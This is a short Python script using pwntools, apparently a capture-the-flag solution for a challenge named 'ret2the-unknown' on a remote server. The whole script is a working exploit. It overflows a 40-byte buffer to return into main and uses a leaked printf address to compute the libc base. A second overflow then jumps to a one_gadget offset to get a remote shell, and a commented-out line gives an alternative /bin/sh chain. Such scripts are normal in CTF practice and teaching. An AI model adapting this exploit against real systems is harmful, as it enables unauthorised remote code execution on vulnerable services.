from pwn import *

libc = ELF('./libc-2.28.so')
io = remote('mc.ax', 31568)
#io = process(["./ld-2.28.so", "ret2the-unknown"], env={"LD_PRELOAD":"./libc-2.28.so"})
print(io.recvuntil(b'safely?'))
io.sendline(b'A'*40+p64(0x0000000000401186))
print(io.recvuntil(b' get there: '))
libc.address = int(io.recvline(), 16)-libc.sym['printf']
print('LIBC: ', hex(libc.address))
print(io.recvuntil(b'safely?'))
#io.sendline(b'A'*40+p64(libc.address+0x23a5f)+p64(next(libc.search(b'/bin/sh')))+p64())
io.sendline(b'A'*40+p64(libc.address+0xe5456))
io.interactive()
